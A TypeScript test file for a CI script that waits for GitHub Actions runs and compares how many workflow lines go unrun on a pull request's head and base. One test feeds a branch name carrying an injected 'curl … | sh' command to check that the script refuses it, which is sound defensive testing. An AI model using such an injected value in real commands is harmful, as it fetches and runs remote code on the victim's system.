import { mkdirSync, mkdtempSync, writeFileSync } from 'node:fs';
import { tmpdir } from 'node:os';
import { join } from 'node:path';
import { describe, it, expect, afterEach, vi } from 'vitest';
import { PATIENCE, main, realClock, waitForRuns, type Clock } from '../../scripts/workflow-coverage-check.ts';

/**
 * The live workflow-coverage check (issue #35, AC5; Shyden 2026-10-27, "a job
 * that waits"): on a pull request it waits for every other run on the head and
 * on its develop merge base to complete, then fails when any workflow file
 * leaves more lines unrun on the head than on the base.
 */

/** A clock that only moves when the code under test waits. */
function fakeClock(): Clock & { waits: number[] } {
  let now = 0;
  const waits: number[] = [];
  return {
    waits,
    now: () => now,
    sleep: (ms) => {
      waits.push(ms);
      now += ms;
      return Promise.resolve();
    },
  };
}

describe('realClock', () => {
  it('reads the wall clock', () => {
    const before = Date.now();
    const now = realClock.now();
    expect([now >= before, now <= Date.now()]).toEqual([true, true]);
  });

  it('waits on a real timer, then resolves', async () => {
    const before = Date.now();
    await realClock.sleep(2);
    expect(Date.now() - before).toBeGreaterThanOrEqual(1);
  });
});

describe('waitForRuns', () => {
  const patience = { ceilingMs: 100_000, intervalMs: 30_000 };
  /** A logger that keeps each line in `log`. */
  const into = (log: string[]) => (line: string) => {
    log.push(line);
  };

  it('returns at once, waiting not at all, when nothing is going', async () => {
    const clock = fakeClock();
    const log: string[] = [];
    await waitForRuns(() => Promise.resolve([]), clock, patience, into(log));
    expect({ waits: clock.waits, log }).toEqual({ waits: [], log: [] });
  });

  it('waits one interval at a time, naming what it waits for, until nothing is going', async () => {
    const clock = fakeClock();
    const log: string[] = [];
    const answers = [['ci.yml run 1 in_progress', 'mutations.yml run 2 queued'], ['ci.yml run 1 in_progress'], []];
    await waitForRuns(
      // Asked once too often, shift() gives nothing and the wait throws: `left` then never reads 0.
      () => Promise.resolve(answers.shift() as string[]),
      clock,
      patience,
      into(log),
    );
    expect({ waits: clock.waits, log, left: answers.length }).toEqual({
      waits: [30_000, 30_000],
      log: [
        'workflow-coverage-check: waiting 30 s on 2 run(s): ci.yml run 1 in_progress; mutations.yml run 2 queued',
        'workflow-coverage-check: waiting 30 s on 1 run(s): ci.yml run 1 in_progress',
      ],
      left: 0,
    });
  });

  it('fails at the ceiling, naming each run still going', async () => {
    const clock = fakeClock();
    await expect(
      waitForRuns(
        () => Promise.resolve(['ci.yml run 1 in_progress']),
        clock,
        patience,
        () => undefined,
      ),
    ).rejects.toThrow('workflow-coverage-check: still going after 120 s, past the 100 s ceiling: ci.yml run 1 in_progress');
    expect(clock.waits).toEqual([30_000, 30_000, 30_000, 30_000]);
  });

  it('waits forty minutes at most, polling every fifteen seconds', () => {
    expect(PATIENCE).toEqual({ ceilingMs: 2_400_000, intervalMs: 15_000 });
  });
});

/** A repository root holding these workflow files. */
function rootWith(files: Record<string, string>): string {
  const root = mkdtempSync(join(tmpdir(), 'workflow-coverage-check-'));
  mkdirSync(join(root, '.github/workflows'), { recursive: true });
  for (const [name, text] of Object.entries(files)) writeFileSync(join(root, '.github/workflows', name), text);
  return root;
}

describe('main', () => {
  const HEAD = 'a'.repeat(40);
  const BASE = 'b'.repeat(40);
  const ONE_STEP = 'on: [push]\njobs:\n  a:\n    steps:\n      - run: echo a\n';
  const TWO_STEPS = `${ONE_STEP}      - run: echo b\n`;

  afterEach(() => {
    vi.unstubAllEnvs();
    vi.restoreAllMocks();
  });

  /** A pull_request event file whose head repository is `headRepo` (null: a deleted fork). */
  function eventFile(headRepo: string | null): string {
    const path = join(mkdtempSync(join(tmpdir(), 'workflow-coverage-event-')), 'event.json');
    writeFileSync(path, JSON.stringify({ pull_request: { head: { repo: headRepo === null ? null : { full_name: headRepo } } } }));
    return path;
  }

  /** The env the check reads, with no run on either commit, for a pull request from `headRepo`. */
  function setUp(head: Record<string, string>, base: Record<string, string>, headRepo: string | null = 'o/r') {
    vi.stubEnv('GITHUB_REPOSITORY', 'o/r');
    vi.stubEnv('GITHUB_TOKEN', 't');
    vi.stubEnv('GITHUB_RUN_ID', '7');
    vi.stubEnv('GITHUB_EVENT_PATH', eventFile(headRepo));
    vi.spyOn(process, 'cwd').mockReturnValue(rootWith(head));
    const printed: string[] = [];
    vi.spyOn(process.stdout, 'write').mockImplementation((text) => printed.push(String(text)) > 0);
    vi.spyOn(process.stderr, 'write').mockImplementation((text) => printed.push(`stderr: ${String(text)}`) > 0);
    const asked: string[] = [];
    const stand = ((url: string) => {
      asked.push(url);
      return Promise.resolve(Response.json({ total_count: 0, workflow_runs: [] }));
    }) as unknown as typeof fetch;
    return { baseRoot: rootWith(base), printed, asked, stand };
  }

  it.each([[[]], [['a', 'b', 'c']], [['a', 'b', 'c', 'd', 'e']]])(
    'refuses %j: it takes the head, the base, the base checkout and the head branch',
    async (args) => {
      await expect(main(args)).rejects.toThrow(
        'usage: node scripts/workflow-coverage-check.ts <head-sha> <base-sha> <base-root> <head-branch>',
      );
    },
  );

  it('refuses an empty head branch: the commands it prints name the scratch branch after it', async () => {
    await expect(main([HEAD, BASE, 'base', ''])).rejects.toThrow(
      'workflow-coverage-check: the head branch is empty; pass "$GITHUB_HEAD_REF"',
    );
  });

  it.each([
    ['head', ['abc1234', BASE, 'base', 'feature']],
    ['base', [HEAD, 'abc1234', 'base', 'feature']],
  ])('refuses a short %s sha', async (_side, args) => {
    await expect(main(args)).rejects.toThrow('workflow-coverage-check: abc1234 is not a full commit sha');
  });

  it.each([
    ['GITHUB_REPOSITORY', '', 'GITHUB_REPOSITORY is empty: name the repository as owner/name'],
    ['GITHUB_TOKEN', '', 'GITHUB_TOKEN is empty: the runs and artifacts are read with it'],
    ['GITHUB_RUN_ID', '', 'GITHUB_RUN_ID is not a run id: the check skips its own run with it'],
    ['GITHUB_RUN_ID', '7x', 'GITHUB_RUN_ID is not a run id: the check skips its own run with it'],
    ['GITHUB_RUN_ID', undefined, 'GITHUB_RUN_ID is not a run id: the check skips its own run with it'],
    ['GITHUB_EVENT_PATH', '', 'GITHUB_EVENT_PATH is empty: the check reads from it whether the pull request comes from a fork'],
  ])('refuses %s set to %j', async (name, value, message) => {
    vi.stubEnv('GITHUB_REPOSITORY', 'o/r');
    vi.stubEnv('GITHUB_TOKEN', 't');
    vi.stubEnv('GITHUB_RUN_ID', '7');
    vi.stubEnv('GITHUB_EVENT_PATH', eventFile('o/r'));
    vi.stubEnv(name, value);
    await expect(main([HEAD, BASE, 'base', 'feature'])).rejects.toThrow(`workflow-coverage-check: ${message}`);
  });

  it('runs on the real clock when given none, waiting not at all when nothing is going', async () => {
    const { baseRoot, stand } = setUp({ 'ci.yml': ONE_STEP }, { 'ci.yml': ONE_STEP });
    expect(await main([HEAD, BASE, baseRoot, 'feature'], stand)).toBe(0);
  });

  it('passes when no file leaves more lines unrun than on the base, after asking both commits for runs', async () => {
    const { baseRoot, printed, asked, stand } = setUp({ 'ci.yml': ONE_STEP }, { 'ci.yml': ONE_STEP });
    expect(await main([HEAD, BASE, baseRoot, 'feature'], stand, fakeClock())).toBe(0);
    const runs = (sha: string) => `https://api.github.com/repos/o/r/actions/runs?head_sha=${sha}&per_page=100`;
    expect(asked).toEqual([runs(HEAD), runs(BASE), runs(HEAD), runs(BASE)]);
    expect(printed).toEqual([
      'workflow-coverage-check: .github/workflows/ci.yml: 5 lines unrun on the head, 5 on the base\n',
      `workflow-coverage-check: no workflow file leaves more lines unrun than on the base ${BASE}\n`,
    ]);
  });

  it('fails naming each file that leaves more lines unrun than on the base, with the head’s unrun lines', async () => {
    const { baseRoot, printed, stand } = setUp({ 'ci.yml': TWO_STEPS, 'new.yml': ONE_STEP }, { 'ci.yml': ONE_STEP });
    expect(await main([HEAD, BASE, baseRoot, 'feature'], stand, fakeClock())).toBe(1);
    expect(printed).toEqual([
      'workflow-coverage-check: .github/workflows/ci.yml: 6 lines unrun on the head, 5 on the base\n',
      'workflow-coverage-check: .github/workflows/new.yml: 5 lines unrun on the head, 0 on the base\n',
      'stderr: workflow-coverage-check: .github/workflows/ci.yml leaves 6 lines unrun, 5 on the base: lines 1, 2, 3, 4, 5, 6\n',
      'stderr: workflow-coverage-check: .github/workflows/new.yml leaves 5 lines unrun, 0 on the base: lines 1, 2, 3, 4, 5\n',
    ]);
  });

  /** A hand-started workflow whose text the reader can lay out; `say` changes its script without adding a line. */
  const handStarted = (say = 'a') => `on:\n  workflow_dispatch:\njobs:\n  a:\n    steps:\n      - run: echo ${say}\n`;
  const RECORD = '.github/workflows/record.yml';
  const run = (id: number, path: string, status: string, event: string) => ({
    id,
    path,
    status,
    event,
    conclusion: status === 'completed' ? 'failure' : null,
  });

  /**
   * A stand-in API whose runs list for `sha` on its n-th ask (from 0) is
   * `runsOf(sha, n)`; every run lists no jobs and no artifacts.
   */
  function standBy(runsOf: (sha: string, ask: number) => ReturnType<typeof run>[]) {
    const asks = new Map<string, number>();
    return ((url: string) => {
      const listed = /head_sha=([0-9a-f]{40})/.exec(url)?.[1];
      if (listed !== undefined) {
        const n = asks.get(listed) ?? 0;
        asks.set(listed, n + 1);
        const runs = runsOf(listed, n);
        return Promise.resolve(Response.json({ total_count: runs.length, workflow_runs: runs }));
      }
      if (url.includes('/jobs?')) return Promise.resolve(Response.json({ total_count: 0, jobs: [] }));
      return Promise.resolve(Response.json({ total_count: 0, artifacts: [] }));
    }) as unknown as typeof fetch;
  }

  it('waits for a run of each hand-started workflow the pull request changes, naming the command that starts it', async () => {
    const { baseRoot, printed } = setUp({ 'record.yml': handStarted('b') }, { 'record.yml': handStarted() });
    const stand = standBy((sha, ask) => (sha === HEAD && ask >= 2 ? [run(11, RECORD, 'completed', 'workflow_dispatch')] : []));
    const clock = fakeClock();
    expect(await main([HEAD, BASE, baseRoot, 'feature/x'], stand, clock)).toBe(0);
    const waiting = `workflow-coverage-check: waiting 15 s on 1 run(s): ${RECORD} has no run on ${HEAD}: start it with gh workflow run record.yml --ref coverage/feature/x/aaaaaaa\n`;
    expect([clock.waits, printed.slice(0, 2)]).toEqual([
      [15_000, 15_000],
      [waiting, waiting],
    ]);
  });

  it('reads the plan again on every ask, so a hand-started run that appears on the base is waited for on the head', async () => {
    const { baseRoot, printed } = setUp(
      { 'record.yml': handStarted(), 'ci.yml': ONE_STEP },
      { 'record.yml': handStarted(), 'ci.yml': ONE_STEP },
    );
    const stand = standBy((sha, ask) => {
      if (sha === HEAD)
        return ask === 0
          ? [run(1, '.github/workflows/ci.yml', 'in_progress', 'pull_request')]
          : ask >= 2
            ? [run(11, RECORD, 'completed', 'workflow_dispatch')]
            : [];
      return ask >= 1 ? [run(12, RECORD, 'completed', 'workflow_dispatch')] : [];
    });
    expect(await main([HEAD, BASE, baseRoot, 'feature'], stand, fakeClock())).toBe(0);
    expect(printed.slice(0, 2)).toEqual([
      'workflow-coverage-check: waiting 15 s on 1 run(s): .github/workflows/ci.yml run 1 in_progress\n',
      `workflow-coverage-check: waiting 15 s on 1 run(s): ${RECORD} has no run on ${HEAD}: start it with gh workflow run record.yml --ref coverage/feature/aaaaaaa\n`,
    ]);
  });

  // Shyden 2026-10-28, "Fence it": a hand-started run gets this repository's
  // secrets, so a fork's workflows are never started; Shyden decides.
  it('fails at once on a fork whose commit would need hand-started runs, naming them, and waits for nothing', async () => {
    const { baseRoot, printed } = setUp({ 'record.yml': handStarted('b') }, { 'record.yml': handStarted() }, 'someone/fork');
    const clock = fakeClock();
    await expect(
      main(
        [HEAD, BASE, baseRoot, 'feature'],
        standBy(() => []),
        clock,
      ),
    ).rejects.toThrow(
      `workflow-coverage-check: this pull request comes from the fork someone/fork: ${RECORD} would have to run on its commit with this repository's secrets, and a fork's workflows never are (#35, Shyden 2026-10-28, "Fence it"); Shyden decides`,
    );
    expect([clock.waits, printed]).toEqual([[], []]);
  });

  it('measures a fork that needs no hand-started run as any other pull request', async () => {
    const { baseRoot, stand } = setUp({ 'ci.yml': ONE_STEP }, { 'ci.yml': ONE_STEP }, 'someone/fork');
    expect(await main([HEAD, BASE, baseRoot, 'feature'], stand, fakeClock())).toBe(0);
  });

  it('refuses an event whose head repository is gone, since it cannot tell a fork', async () => {
    const { baseRoot, stand } = setUp({ 'ci.yml': ONE_STEP }, { 'ci.yml': ONE_STEP }, null);
    await expect(main([HEAD, BASE, baseRoot, 'feature'], stand, fakeClock())).rejects.toThrow(
      /workflow-coverage-check: the event at .+ names no pull_request\.head\.repo\.full_name/,
    );
  });

  it('fails rather than print a start command for a branch a pasted command would run', async () => {
    const { baseRoot, printed } = setUp({ 'record.yml': handStarted('b') }, { 'record.yml': handStarted() });
    await expect(
      main(
        [HEAD, BASE, baseRoot, 'x;curl e.sh|sh'],
        standBy(() => []),
        fakeClock(),
      ),
    ).rejects.toThrow('coverage-dispatch: the branch "x;curl e.sh|sh" holds characters a pasted command would run; start its runs by hand');
    expect(printed).toEqual([]);
  });

  it('counts a hand-started run that failed as a run: the comparison judges what it left unrun', async () => {
    const { baseRoot } = setUp({ 'record.yml': handStarted('b') }, { 'record.yml': handStarted() });
    const stand = standBy((sha) => (sha === HEAD ? [run(11, RECORD, 'completed', 'workflow_dispatch')] : []));
    const clock = fakeClock();
    expect([await main([HEAD, BASE, baseRoot, 'feature'], stand, clock), clock.waits]).toEqual([0, []]);
  });

  it('leaves a new hand-started workflow out of the comparison and names it (ruling 2)', async () => {
    const { baseRoot, printed, stand } = setUp({ 'ci.yml': ONE_STEP, 'probe.yml': handStarted() }, { 'ci.yml': ONE_STEP });
    expect(await main([HEAD, BASE, baseRoot, 'feature'], stand, fakeClock())).toBe(0);
    expect(printed).toEqual([
      'workflow-coverage-check: .github/workflows/ci.yml: 5 lines unrun on the head, 5 on the base\n',
      'workflow-coverage-check: .github/workflows/probe.yml: not measurable until on develop (#35 ruling 2)\n',
      `workflow-coverage-check: no workflow file leaves more lines unrun than on the base ${BASE}\n`,
    ]);
  });

  it('fails at the ceiling naming each missing run, and says the one re-run ruling 3 allows', async () => {
    const { baseRoot } = setUp({ 'record.yml': handStarted('b') }, { 'record.yml': handStarted() });
    await expect(
      main(
        [HEAD, BASE, baseRoot, 'feature'],
        standBy(() => []),
        fakeClock(),
      ),
    ).rejects.toThrow(
      `still going after 2400 s, past the 2400 s ceiling: ${RECORD} has no run on ${HEAD}: start it with gh workflow run record.yml --ref coverage/feature/aaaaaaa. Start each missing run, then re-run this workflow-coverage job once (#35 ruling 3)`,
    );
  });

  it('waits for a run still going on the base, naming it, before it measures', async () => {
    const { baseRoot, printed } = setUp({ 'ci.yml': ONE_STEP }, { 'ci.yml': ONE_STEP });
    const stand = standBy((sha, ask) => (sha === BASE && ask === 0 ? [run(5, '.github/workflows/ci.yml', 'in_progress', 'push')] : []));
    const clock = fakeClock();
    expect([await main([HEAD, BASE, baseRoot, 'feature'], stand, clock), clock.waits, printed[0]]).toEqual([
      0,
      [15_000],
      'workflow-coverage-check: waiting 15 s on 1 run(s): .github/workflows/ci.yml run 5 in_progress\n',
    ]);
  });

  it('fails at the ceiling on a run still going with no word of a re-run: nothing was missing', async () => {
    const { baseRoot } = setUp({ 'ci.yml': ONE_STEP }, { 'ci.yml': ONE_STEP });
    const stand = standBy((sha) => (sha === HEAD ? [run(1, '.github/workflows/ci.yml', 'in_progress', 'pull_request')] : []));
    await expect(main([HEAD, BASE, baseRoot, 'feature'], stand, fakeClock())).rejects.toThrow(
      /past the 2400 s ceiling: \.github\/workflows\/ci\.yml run 1 in_progress$/,
    );
  });
});
